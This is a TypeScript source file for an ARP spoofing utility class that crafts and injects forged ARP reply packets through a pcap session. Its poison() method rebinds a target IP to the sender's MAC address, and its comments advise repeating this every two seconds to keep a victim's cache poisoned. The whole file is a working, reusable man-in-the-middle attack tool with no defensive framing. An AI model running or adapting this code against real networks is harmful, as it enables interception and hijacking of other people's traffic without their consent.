import {createSession, PcapSession} from "pcap";
import {NetworkUtils} from "./network-utils";

export type PacketOp = 'request' | 'reply';

/**
 * ARP spoofing utils
 * YOU MUST CLOSE THE SESSION TO PREVENT MEMORY LEAKS. The .close() will achieve this.
 */
export class ArpSpoof {
    private readonly session: PcapSession;

    constructor(private readonly inf: string) {
        this.session = createSession(inf, {});
    }

    /**
     * Poison a client's ARP record. You probably want to do this every ~2 seconds.
     * @param srcIp
     * @param dstIp
     */
    public poison = async (srcIp: string, dstIp: string) => {
        await this.sendRawPacket({
            'op': 'reply',
            'src_ip': srcIp,
            'dst_ip': dstIp,
            'dst_mac': 'ff:ff:ff:ff:ff:ff'
        })
    }

    /**
     * Close the session on the interface
     */
    public close = () => this.session.close();

    /**
     * Send a raw packet. This is used internally, however, I've exposed it if you need to do some fancy things.
     * @param payload
     */
    public sendRawPacket = async (payload: {
        op: PacketOp,
        src_ip: string,
        dst_ip: string,
        dst_mac: string,
        ether_type?,
        hw_type?,
        proto_type?,
        hw_len?,
        proto_len?,
    }) => {
        const interfaceData = await NetworkUtils.getInterface(this.inf);
        if (!interfaceData) throw new Error('Interface has invalid data');

        // THE ORDER OF THE ITEMS IN THIS OBJECT IS CRITICAL
        const packet = {
            dst: this.macToArray(payload.dst_mac),
            src: this.macToArray(interfaceData.mac_address),

            ether_type: payload.ether_type ?? [0x08, 0x06],
            hw_type: payload.hw_type ?? [0x00, 0x01],
            proto_type: payload.proto_type ?? [0x08, 0x00],

            hw_len: payload.hw_len ?? [0x06],
            proto_len: payload.proto_len ?? [0x04],

            op: payload.op === 'reply' ? [0x00, 0x02] : [0x00, 0x01],

            src_mac: this.macToArray(interfaceData.mac_address),
            src_ip: this.ipToArray(payload.src_ip),
            dst_mac: this.macToArray(payload.dst_mac),
            dst_ip: this.ipToArray(payload.dst_ip),
        };

        // Convert the package object into an array to send
        let packetData = [];
        for (let property in packet) packetData = packetData.concat(packet[property]);

        const buffer = Buffer.from(packetData);
        this.session.inject(buffer);
    }

    private macToArray = (mac: string): string[] => mac.split(':').map(split => `0x${ split }`);
    private ipToArray = (mac: string): string[] => mac.split('.');
}
